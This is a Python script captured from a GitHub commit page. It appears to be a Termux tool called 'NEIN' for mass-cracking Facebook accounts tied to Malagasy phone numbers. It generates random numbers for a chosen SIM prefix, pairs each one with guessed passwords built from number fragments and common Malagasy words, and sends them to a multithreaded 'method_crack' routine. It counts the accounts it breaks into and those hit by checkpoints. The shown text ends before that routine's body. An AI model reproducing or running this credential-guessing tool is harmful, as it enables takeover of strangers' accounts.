# Définir le numéro de version
version_actuelle = "1.5"

import os
import random
import string 
import uuid
import json
import subprocess
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import sys
import secrets
import getpass
# Mot de passe pour déverrouiller le script
mot_de_passe = "ITACHI2024"
# Demander à l'utilisateur de saisir le mot de passe
saisie_mot_de_passe = getpass.getpass("Veuillez entrer le mot de passe : ")
# Vérifier si le mot de passe saisi est correct
if saisie_mot_de_passe == mot_de_passe:
    print("Mot de passe correct. Exécution de git pull...")
    # Exécuter la commande git pull
    try:
        subprocess.run(["git", "pull"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de l'exécution de git pull : {e}")
        exit(1)
    print("Git pull terminé avec succès !")
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
# Liste des couleurs pour le logo, les lignes et chaque mot
logo_colors = [B, C, P, H]
line_colors = [bblack, M, H, byellow, bblue, P, C, B]
word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
#-------------logo-----------------#
logo=(f'''{B}
                                 
,--.  ,--.,------.,--.,--.  ,--. 
|  ,'.|  ||  .---'|  ||  ,'.|  | 
|  |' '  ||  `--, |  ||  |' '  | 
|  | `   ||  `---.|  ||  | `   | 
`--'  `--'`------'`--'`--'  `--' 
                                 
                                            
{warna}--------------------------------------------{B}
 Owner    : {M}CHRICE999{M}
 TOOL NAME : {warna}{P}NEIN{P}{warna}
 GROUPE-FB   : [TERMUX-COMAND]
 STATUE : {H}FREE{H}
 Facebook : {bblue}ITACHI SQ{bblue}
 Tools    : {warna}[{M}VERSION 1.5{warna}]{warna}
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    os.system('clear')
    print(logo)
#-------------main def------------#
def MR_ITACHI():
    clear()
    os.system('xdg-open https://facebook.com/groups/641144864016773/')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOISIR MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' MERCI BEAUCOUP  :)')
#------------- bd clone def ----------#
def BD_CLONING():
    user=[]
    clear()
    print(' CODE SIM MALAGASY : [26132] [26134] [26138] [26133]')
    print(' 261=0 Madagascar : [032] [034] [038] [033]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(map(str, generate_random_sequence(7)))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' CLONING EN COURS ... ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
            Dipto.submit(method_crack,ids,passlist)
    linex()
    print(' LE CLONING EST FINI ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_ITACHI()
#------------ method crack def ---------#
0 comments on commit e73db16
Comment
 
Leave a comment
 
 You’re not receiving notifications from this thread.
Footer
© 2024 GitHub, Inc.
Footer navigation
Terms
Privacy
Security
Status
Docs
Contact
Manage cookies
Do not share my personal information
Add files via upload · chrice999/chrice999@e73db16
